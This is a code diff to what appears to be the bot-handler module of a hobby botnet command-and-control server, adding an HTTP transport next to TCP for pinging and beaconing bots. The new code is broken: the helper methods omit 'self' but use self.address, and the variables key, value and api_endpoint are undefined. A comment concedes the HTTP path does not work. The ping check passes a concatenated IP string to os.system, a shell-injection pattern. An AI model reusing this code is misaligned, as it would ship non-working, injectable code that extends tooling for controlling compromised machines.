@@ -35,6 +35,7 @@ class Handler(threading.Thread):
             self.loggers = args[3]
             self.ip = '127.0.0.1'
             self.port = 5000
+            self.address = "http://127.0.0.1:5000"
             self.bot_id = args[0]
             self.info = [self.bot_id,self.ip,self.port]
             self.beacon_wait = False
@@ -46,6 +47,17 @@ class Handler(threading.Thread):
                                                             # [0] = PING, [1] = BEACON
         # Log by
 
+    # HTTP helper functions
+    def api_get_request(endpoint):
+        response_raw = requests.get(self.address + endpoint).text
+        response_json = json.loads(response_raw)
+        return response_json
+
+    def api_post_request(endpoint, payload):
+        response_raw = requests.post(self.address + endpoint, json=payload).text
+        response_json = json.loads(response_raw)
+        return response_json
+
     def run(self):
 
         # Returns 'Thread-#': Useful for specific interaction?
@@ -56,10 +68,11 @@ class Handler(threading.Thread):
         loggers[0].q_log('conn','info','[* BotHandler-Msg] Bot '+self.ip+':'+str(self.port)+' connected with Session ID of '+str(self.bot_id))
         loggers[0].q_log('serv','info','[* BotHandler-Msg] Bot handler object created for: '+self.ip+':'+str(self.port)+'; Session ID of '+str(self.bot_id))
 
-
+        #Not working for http currently (delete if statement once working)
         # Grab operating system : Linux/Windows
-        self.setOS()
-        loggers[0].q_log('serv','info','[* BotHandler-Msg] Bot '+str(self.bot_id)+' operating system set: '+str(self.os))
+        if(self.transport_type == "tcp"):
+            self.setOS()
+            loggers[0].q_log('serv','info','[* BotHandler-Msg] Bot '+str(self.bot_id)+' operating system set: '+str(self.os))
 
 
         # Beacon indefinitely??
@@ -86,12 +99,19 @@ class Handler(threading.Thread):
 
             # Check HOST-STATUS
             try:
-                ping = os.system("ping -c 2 -w2 " + self.ip + " > /dev/null 2>&1")
-                if ping == 0:
-                    self.status[0] = "UP"
+                # TCP
+                if(self.transport_type == "tcp"):
+                    ping = os.system("ping -c 2 -w2 " + self.ip + " > /dev/null 2>&1")
+                    if ping == 0:
+                        self.status[0] = "UP"
 
-                else:
-                    self.status[0] = "DOWN"
+                    else:
+                        self.status[0] = "DOWN"
+                # HTTP
+                elif(self.transport_type == "http"):
+                    request_payload_string = f'[{{"task_type":"ping","{key}":"{value}"}}]'
+                    request_payload = json.loads(request_payload_string)
+                    pprint.pprint(api_post_request(api_endpoint, request_payload))
 
             except:
                 self.status[0] = "ERR"
